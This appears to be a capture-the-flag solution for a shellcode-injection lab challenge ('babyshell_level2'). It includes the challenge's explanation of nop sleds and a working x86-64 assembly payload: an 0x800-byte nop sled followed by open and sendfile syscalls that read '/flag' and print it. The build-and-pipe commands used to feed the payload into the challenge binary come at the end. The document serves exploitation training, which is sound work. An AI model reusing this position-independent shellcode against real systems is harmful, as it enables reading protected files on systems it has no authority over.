[LEAK] Placing shellcode on the stack at 0x7ffcb9806dd0!
In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every
execution, your shellcode will need to be *position-independent*.

Reading 0x1000 bytes from stdin.

Executing filter...

This challenge will randomly skip up to 0x800 bytes in your shellcode. You better adapt to that! One way to evade this
is to have your shellcode start with a long set of single-byte instructions that do nothing, such as `nop`, before the
actual functionality of your code begins. When control flow hits any of these instructions, they will all harmlessly
execute and then your real shellcode will run. This concept is called a `nop sled`.

.global _start
_start: 
.intel_syntax noprefix

.rept 0x800
nop
.endr

mov rbx, 0x00000067616c662f	# push "/flag" filename
push rbx
mov rax, 2				# syscall number of open
mov rdi, rsp				# point the first argument at stack (where we have "/flag").
mov rsi, 0				# NULL out the second argument (meaning, O_RDONLY).
syscall				# trigger open("/flag", NULL).
mov rdi, 1				# first argument to sendfile is the file descriptor to output to (stdout).
mov rsi, rax				# second argument is the file descriptor returned by open
mov rdx, 0				# third argument is the number of bytes to skip from the input file
mov r10, 1000				# fourth argument is the number of bytes to transfer to the output file
mov rax, 40				# syscall number of sendfile
syscall				# trigger sendfile(1, fd, 0, 1000).
mov rax, 60				# syscall number of exit
syscall				# trigger exit().

/*gcc -nostdlib -static test.s -o shellcode
/*objcopy --dump-section .text=shellcode-raw shellcode
/*(cat ./shellcode-raw; cat) | /challenge/babyshell_level2